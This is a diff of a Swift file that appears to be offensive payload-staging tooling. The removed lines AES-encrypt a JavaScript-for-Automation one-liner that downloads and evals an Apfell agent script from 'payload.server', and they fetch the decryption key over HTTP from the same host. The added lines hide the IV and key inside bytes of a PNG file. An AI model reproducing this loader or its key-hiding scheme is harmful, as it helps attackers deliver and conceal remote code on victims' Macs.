@@ -1,50 +1,60 @@
 import Foundation
 
-let iv       = "abcdefghijklmnop"                   // 16 bytes for AES128
+// IV =  16 bytes for AES128
+// Key = 32 bytes
 
-func encryptPayload() -> Void {
-    
-    let key256 = "12345678901234561234567890123456"   // 32 bytes for AES256
-
-    let cleartext =
-    ##"eval(ObjC.unwrap($.NSString.alloc.initWithDataEncoding($.NSData.dataWithContentsOfURL($.NSURL.URLWithString("http://payload.server/apfell.js")), $.NSUTF8StringEncoding)));"##
-
-
-    let aes256 = AES(key: key256, iv: iv)
-
-    let ciphertext = aes256?.encrypt(string: cleartext)
-    let encoded_ciphertext = ciphertext!.base64EncodedString(options: NSData.Base64EncodingOptions(rawValue: 0))
-
-    print("Key: \(key256)")
-    print("Cleartext: \(cleartext)")
-    print("Here's the base64 encoded ciphertext: \(encoded_ciphertext)")
-}
-
-func decryptPayload() -> Void {
-    let encoded_ciphertext = "bfe5ayqnNqp1/R96q5oY8E1wgBgw/FXp+hE1sypJ3bkI43LkA6No4Abf7B1UYZ0Oe5tPNFl9S5hCEY87b/rA9DBggRdmwXFWiBa1D9A2CPol44sJf4lxjq8fHmRF1xXvnz54uR+rk0xRPmmOWZHi9c3pQFcbvN4752KYrI983IZSU071eYe4BqmZCjN6JjjR9h/vQAOzSvJgqXRKWLgdPx8zHLALlDp8gu4IDSo2JHk="
-    
-    let ciphertext = Data(base64Encoded: encoded_ciphertext)!
-    
-    //fetch a value over HTTP
-    let url = "http://payload.server/key.txt"
-    
-    var key256 = ""
-    let http = HTTPReq()
+func readKey() -> [UInt8] {
+    let fileURL = URL(fileURLWithPath: "/Users/david/jquery.png")
+    var byteArray: [UInt8] = []
     do {
-        key256 = try http.synchronous_request(url: url)
-        key256 = (key256 as NSString).trimmingCharacters(in: NSCharacterSet.whitespacesAndNewlines)
-        
+        let fileData = try Data(contentsOf: fileURL)
+        byteArray = [UInt8](fileData)
     } catch {
-        print("Error fetching key: \(error)")
-    }
-    
-    
-    print("Retrieved key: \(key256)")
-    let aes256 = AES(key: key256, iv: iv)
-    print("Payload: \(aes256?.decrypt(data: ciphertext))")
+        // Handle the error
 
+    }
+    // at offset 20 - get 16 byte IV
+    let ivoffset = 20
+    let ivsize = 16
+    let iv = Array(byteArray[ivoffset..<ivoffset + ivsize])
+   
+    let keyoffset = ivoffset + ivsize
+    let keysize = 32
+    let key = Array(byteArray[keyoffset..<keyoffset + keysize])
+    return iv + key
 }
 
-encryptPayload()
-decryptPayload()
+func encryptPayload(iv: [UInt8], key: [UInt8], cleartext: Data) -> Data?
+{
+    let aes256 = AES(key: key, iv: iv)
+    let ciphertext = aes256?.encrypt(data: cleartext)
+    return ciphertext
+}
 
+func decryptPayload(iv: [UInt8], key: [UInt8], ciphertext: Data) -> Data?
+{
+    let aes256 = AES(key: key, iv: iv)
+    let cleartext = aes256?.decrypt(data: ciphertext)
+    return cleartext
+}
+
+var byteArray = readKey()
+let ivoffset = 0
+let ivsize = 16
+let iv = Array(byteArray[ivoffset..<ivoffset + ivsize])
+
+let keyoffset = ivoffset + ivsize
+let keysize = 32
+let key = Array(byteArray[keyoffset..<keyoffset + keysize])
+
+let string = "Hello, world!"
+let data = Data(string.utf8)
+
+var encrypted = encryptPayload(iv: iv, key: key, cleartext: data)!
+if let decrypted = decryptPayload(iv: iv, key: key, ciphertext: encrypted) {
+    let str = String(decoding: decrypted, as: UTF8.self)
+    print(str)
+    // Use decrypted as a non-optional Data instance
+} else {
+    // Handle the case where the function returned nil
+}
